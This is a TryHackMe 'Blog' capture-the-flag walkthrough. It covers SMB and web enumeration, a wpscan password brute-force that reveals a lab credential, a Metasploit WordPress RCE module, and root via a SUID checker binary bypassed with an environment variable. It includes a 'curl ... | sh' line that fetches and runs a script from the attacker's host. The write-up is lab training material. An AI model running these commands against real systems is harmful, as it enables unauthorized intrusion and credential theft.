Blog-tryhackme ;22 JUL 2021  

machine ip : 10.10.116.161

## SCANNING 

### basic scanning 

└─$ nmap -sV -v 10.10.116.161 -oN nmap/intial

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

```

ENUMRATION
==========
smb service
------------
└─$ smbclient -L 10.10.116.161                                                                                                                                                      
`  BillySMB        Disk      Billy's local SMB Share `

└─$ smbclient -N //10.10.116.161/BillySMB

```
 Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
 tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
 check-this.png                      N     3082  Tue May 26 14:13:43 2020

```
[*] download them all and check them 

$ steghide extract -sf Alice-White-Rabbit.jpg  

wrote extracted data to "rabbit_hole.txt".
```
$ cat rabbit_hole.txt                                                                                                 
You've found yourself in a rabbit hole, friend.

```

http service 
--------------
[*] searching for directories .

└─$ gobuster dir -u "http://10.10.116.161/" -w=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  | tee gobuster.txt
```
/rss                  (Status: 301) [Size: 0] [--> http://10.10.116.161/feed/]
/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.116.161/feed/]  
/atom                 (Status: 301) [Size: 0] [--> http://10.10.116.161/feed/atom/]
/wp-content           (Status: 301) [Size: 319] [--> http://10.10.116.161/wp-content/]
/admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]         
/wp-includes          (Status: 301) [Size: 320] [--> http://10.10.116.161/wp-includes/]
/dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]          
```

## note :
because blog.thm is a local webpage and hence we are in the same network with the machine we need to provide ip and name in the /etc/hosts "dns" . so we can access the page .

10.10.116.161    blog.thm

[*] let's look at this page :
http://blog.thm/wp-login.php
### via wappalyzer extenstion i know it is wordpress 5.0 

Billy Joel : not a valid user name .

[*] using wpscan to enumrate users 

" it just get names from the web page 'comments'.'posts','etc' so some can be wrong "

─$ wpscan --url blog.thm --enumerate u | tee wpscan-users   


let's try results to verify :       

```
kwheel  "works"
bjoel   "works"
karen Wheeler XX
Billy joel XX

```
[*] hence bjoel works at IT field it doesn't seem his password will be so easy to crack so let's try kwheel first and see results !



[*] using wpscan to crack kwheel password 

└─$ wpscan --url blog.thm -U kwheel  -P /usr/share/wordlists/rockyou.txt               2 ⨯

```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1     

```

### we can also use hydra and provide it with the failed message .

when password is wrong our post request response is :

log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1

EXPLOITATION
=============
goal is to upload a php revere shell and get in .
no plugins or themes options in the page :( .
let's try metasploit module .

multi/http/wp_crop_rce  # fits the wordpress 5.0 rce .
### set password ,username , rhost= blog.thm ,lhost  then exploit .


================== WE GOT A SESSION ================

Server username: www-data (33)

to get a stable shell :
$shell
$python -c "import pty ; pty.spawn('/bin/bash')"
[*]seaching for user.txt
/home/bjoel/user.txt
```
You won't find what you're looking for here.

TRY HARDER
```
"it doesn't work :( as a submission"

pdf file :
---------
```
This letter is to inform you that your employment with Rubber Ducky Inc. will end effective immediately
on 5/20/2020.

```
so it seems a /media/usb relevant but we need to be root to access it .

PRIVILEGE ESCALATION
====================
$sudo -l
we need our password so not helpful .

$find / -type f -user root -perm -4000 -exec ls -l {} + 2>/dev/null

let's check this :
-rwsr-xr-x 1 root root            136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo#need password
-rwsr-sr-x 1 root root              8432 May 26  2020 /usr/sbin/checker

https://gtfobins.github.io/#checker #no results :(

try to run it 
/usr/sbin/checker
Not an Admin

linpeas
========
on my side :
-------------
(kali㉿kali)-[~/Tryhackme/blog/linpeas]
└─$ python3 -m http.server  

on victim side :
-----------------

$curl "http://10.8.203.221:8000/linpeas.sh" | sh

doesn't help alot but we know a user exists .

bjoel:x:1000:1000:Billy Joel:/home/bjoel:/bin/bash


download this checker file and try to get any info using cutter or IDA .
meterpreter > download /usr/sbin/checker .

cutter results :

![cutter](https://user-images.githubusercontent.com/67979878/126591875-65cf2723-f362-4e08-82fc-b60e690c2717.PNG)

we can see it checks in /bin/bash if varirable admin is not 0x00 . 
so let's try set value before executing it  .
$export admin=admin

$/usr/sbin/checker 

=============== NOW WE ARE ROOT ===============

$cat /media/usb/user.txt

$cat /root/root.txt
